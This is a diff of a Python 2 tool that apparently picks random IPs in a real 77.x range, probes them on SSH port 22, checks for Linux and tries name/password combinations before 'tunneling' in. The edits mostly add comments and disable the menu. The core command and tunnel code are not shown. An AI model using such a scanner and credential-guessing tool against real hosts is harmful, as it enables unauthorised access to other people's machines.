@@ -27,18 +27,24 @@ def menu():
 """
 
 
-def get_list():
-    nm = nmap.PortScanner()
-    nm.scan()
-    return nm.all_hosts()
+def get_list():  # scans and returns  a list of all the machines on the network
+    # nm = nmap.PortScanner()
+    # nm.scan()
+    # return nm.all_hosts()
+    addrlist = socket.getaddrinfo(socket.gethostname(), None)
+    ls = ""
+    i = 1
+    for item in addrlist:
+        ls += "Ip number " + str(i) + ": " + item[4][0] + "\n"
+        i += 1
+    return ls
 
 
-def get_info():
-    ip = raw_input("Insert ip: ")
-    return os.system('nmap -O -Pn ' + ip)
+def get_info(ip):  # checks and return machine's OS
+    return 1
 
 
-def generate_ip():
+def generate_ip():  # generates random ip
     str_ip = "77."
     int_ip = random.randint(124, 127)
     str_ip += str(int_ip) + '.'
@@ -50,7 +56,7 @@ def generate_ip():
     return str_ip
 
 
-def check_if_up(ip):
+def check_if_up(ip):  # checks if machine is up
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.connect_ex((ip, 22))
@@ -63,7 +69,7 @@ def check_if_up(ip):
     return result
 
 
-def ran_ip():
+def ran_ip():  # checks and initial tunneling on a random host
     ip = generate_ip()
     pat = re.compile("Linux")
     ops = ""
@@ -76,7 +82,7 @@ def ran_ip():
     tunnel(ip)
 
 
-def known_ip(ip=DEFAULT_IP):
+def known_ip(ip=DEFAULT_IP):  # checks if machine is up and Linux, than starts tunneling
     """pat = re.compile("Linux")
     ops = ""
     if check_if_up(ip):
@@ -97,7 +103,7 @@ def known_ip(ip=DEFAULT_IP):
 #         known_ip()
 #     return ip
 
-
+"""
 def handle(ans):
     if ans == 1:
         print get_list()
@@ -105,7 +111,7 @@ def handle(ans):
         print get_info()
     if ans == 3:
         known_ip(ip=raw_input("insert ip: "))
-
+"""
 
 def check(ans):
     return ans in [1, 2, 3]
@@ -157,8 +163,9 @@ def check_name_and_password((name, password, ip)):
 
     filename = 'logs/output%d.log' % os.getpid()
     with io.open(filename, 'w') as writer, io.open(filename, 'rb', 1) as reader:
-        process = subprocess.Popen(command, stdout=writer,
-                                            shell=True)
+        process = subprocess.Popen(command,
+                                   stdout=writer,
+                                   shell=True)
         time.sleep(7)
         process.kill()
 
@@ -257,6 +264,7 @@ def tunnel(ip):
 
 
 def main():
+    """
     ans = input(menu())
     while ans != 4:
         if check(ans):
@@ -264,7 +272,7 @@ def main():
         else:
             print "Invalid request"
         ans = input(menu())
-
+"""
 
 if __name__ == '__main__':
     main()
